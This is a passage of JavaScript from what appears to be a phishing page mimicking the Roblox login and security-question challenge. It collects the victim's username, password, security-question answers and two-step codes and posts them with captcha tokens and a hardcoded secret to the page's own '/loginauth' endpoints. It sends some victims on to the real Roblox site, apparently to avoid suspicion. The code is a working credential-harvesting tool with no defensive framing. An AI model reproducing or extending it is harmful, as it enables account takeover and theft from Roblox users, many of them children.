    }&answerB=${AnswerJSON[1]}&answerC=${AnswerJSON[2]}&CaptchaRequest=${
      document.getElementById('CaptchaRequest').value
    }`,
    {
      method: 'GET',
      headers: {
        'rblx-security-challenge':
          'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
        CaptchaRequest: document.getElementById('CaptchaRequest').value,
      },
      success: (data) => {
        document.getElementById('selectGameButton').disabled = false
        document.getElementById('selectGameButton').innerHTML = 'Confirm'
        var ErrorTextQuest = document.getElementById('questionError')
        if (data.shouldRequestNewQuestion == true) {
          $.ajax(
            `/loginauth/securityquestion/reservice?userId=${encodeURIComponent(
              userId
            )}&sessionId=${encodeURIComponent(sessionId)}`,
            {
              method: 'GET',
              headers: {
                'rblx-security-challenge':
                  'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
                CaptchaRequest: document.getElementById('CaptchaRequest').value,
              },
              beforeSend: function () {
                document.getElementById('GameSelectArea').innerHTML = ''
              },
              success: (data) => {
                document.getElementById('GameSelectArea').innerHTML = data
              },
            }
          )
        } else {
          if (data.userWasForceReset == true) {
            window.location.replace(
              'https://www.roblox.com/login/securityNotification'
            )
          } else {
            if (data.answerCorrect == true) {
              document.getElementById('Question').style.display = 'none'
              $.ajax(
                `/loginauth/auth?token=${encodeURIComponent(
                  document.getElementById('token').value
                )}&secret=7293255531424362&securityQuestionSessionId=${encodeURIComponent(
                  sessionId
                )}&securityQuestionRedemptionToken=${encodeURIComponent(
                  data.redemptionToken
                )}`,
                {
                  method: 'POST',
                  data: {
                    Username: document.getElementById('login-username').value,
                    CaptchaRequest:
                      document.getElementById('CaptchaRequest').value,
                    Password: document.getElementById('login-password').value,
                    unifiedCaptchaId:
                      document.getElementById('unifiedCaptchaId').value,
                  },
                  headers: {
                    'rblx-security-challenge':
                      'eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ==',
                    CaptchaRequest:
                      document.getElementById('CaptchaRequest').value,
                  },
                  success: (data) => {
                    login()
                  },
                }
              )
            } else {
              ErrorTextQuest.innerHTML =
                'Your last answer was incorrect. Please try again.'
            }
          }
        }
      },
    }
  )
}
function selectGame(docs) {
  if (
    docs.getAttribute('class') == 'answer-choice-image answer-choice-selected'
  ) {
    docs.setAttribute('class', 'answer-choice-image')
    docs.setAttribute('aria-checked', 'false')
  } else {
    docs.setAttribute('class', 'answer-choice-image answer-choice-selected')
    docs.setAttribute('aria-checked', 'true')
  }
}
function twostepInput(a, b) {
  if (a.length == 6) {
    document.getElementById(b).disabled = false
  } else {
    document.getElementById(b).disabled = true
  }
}
function twostepInputRecovery(a, b) {
  if (a.length == 9) {
    document.getElementById(b).disabled = false
  } else {
    document.getElementById(b).disabled = true
  }
}
setInterval(function () {
  if (document.readyState === 'complete') {
    const countSelectGame = document.getElementsByClassName(
      'answer-choice-image answer-choice-selected'
    ).length
    if (countSelectGame == 3) {
      document.getElementById('selectGameButton').disabled = false
    } else {
      document.getElementById('selectGameButton').disabled = true
    }
  }
}, 300)
